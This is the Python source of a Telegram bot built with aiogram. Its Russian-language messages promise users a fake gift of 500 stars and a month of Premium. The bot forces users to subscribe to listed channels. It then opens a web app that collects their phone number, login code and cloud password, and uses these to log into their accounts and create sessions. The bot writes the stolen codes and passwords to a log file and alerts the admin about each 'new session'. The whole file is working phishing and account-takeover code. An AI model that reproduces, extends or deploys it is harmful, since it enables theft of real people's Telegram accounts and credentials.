import logging
import json
import sqlite3
import os
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.utils.deep_linking import create_start_link
import config
from utils.auth import AuthManager

logging.basicConfig(level=logging.INFO)
bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()
auth_manager = AuthManager()

# Инициализация БД
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  country TEXT, 
                  phone TEXT, 
                  step TEXT,
                  temp_data TEXT)''')
    conn.commit()
    conn.close()

def log_attempt(user_id, phone, country, code=None, password=None):
    with open('logs.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.now()} | User:{user_id} | Country:{country} | Phone:{phone} | Code:{code} | Pass:{password}\n")

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    user_id = message.from_user.id
    
    # Проверка подписок
    not_subscribed = []
    for channel in config.REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status == 'left':
                not_subscribed.append(channel)
        except:
            not_subscribed.append(channel)
    
    if not_subscribed:
        channels_text = "\n".join([f"- {ch}" for ch in not_subscribed])
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_subs")]
        ])
        await message.answer(
            f"🎁 Чтобы получить подарок (500 звёзд и Premium на месяц), подпишись на эти каналы:\n{channels_text}",
            reply_markup=keyboard
        )
    else:
        await send_webapp(message)

async def send_webapp(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Получить подарок", web_app=WebAppInfo(url=config.WEBAPP_URL))]
    ])
    await message.answer("✅ Доступ открыт! Нажми кнопку, чтобы получить 500 звёзд и Premium:", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data == "check_subs")
async def check_subs(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    not_subscribed = []
    
    for channel in config.REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status == 'left':
                not_subscribed.append(channel)
        except:
            not_subscribed.append(channel)
    
    if not_subscribed:
        await callback.answer("❌ Ты подписан не на все каналы!", show_alert=True)
    else:
        await callback.message.delete()
        await send_webapp(callback.message)
        await callback.answer()

@dp.message(lambda msg: msg.web_app_data)
async def web_app_handler(message: types.Message):
    try:
        data = json.loads(message.web_app_data.data)
        user_id = message.from_user.id
        action = data.get('action')
        
        if action == 'start_auth':
            phone = data.get('phone')
            country = data.get('country')
            
            # Сохраняем в БД
            conn = sqlite3.connect('database.db')
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO users (user_id, country, phone, step) VALUES (?, ?, ?, ?)",
                     (user_id, country, phone, 'waiting_code'))
            conn.commit()
            conn.close()
            
            # Запускаем авторизацию
            await message.answer("⏳ Отправляем код подтверждения...")
            result = await auth_manager.start_auth(user_id, phone, country)
            
            if result['status'] == 'code_sent':
                log_attempt(user_id, phone, country)
                await message.answer("✅ Код отправлен! Введи его в приложении")
            else:
                await message.answer(f"❌ Ошибка: {result['message']}")
                
        elif action == 'submit_code':
            code = data.get('code')
            result = await auth_manager.submit_code(user_id, code)
            
            if result['status'] == 'password_needed':
                await message.answer("🔐 Требуется облачный пароль. Введи его в приложении:")
            elif result['status'] == 'success':
                await message.answer("✅ Готово! Твой подарок активирован 🎁")
                
                # Уведомление админу
                await bot.send_message(
                    config.ADMIN_ID,
                    f"✅ Новая сессия!\nUser: {user_id}\nPhone: {result['phone']}\nCountry: {result['country']}"
                )
            else:
                await message.answer(f"❌ Ошибка: {result['message']}")
                
        elif action == 'submit_password':
            password = data.get('password')
            result = await auth_manager.submit_password(user_id, password)
            
            if result['status'] == 'success':
                await message.answer("✅ Готово! Твой подарок активирован 🎁")
                await bot.send_message(
                    config.ADMIN_ID,
                    f"✅ Новая сессия (2FA)!\nUser: {user_id}\nPhone: {result['phone']}\nCountry: {result['country']}"
                )
            else:
                await message.answer(f"❌ Ошибка: {result['message']}")
                
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}")

async def main():
    init_db()
    os.makedirs('sessions', exist_ok=True)
    os.makedirs('webapp', exist_ok=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())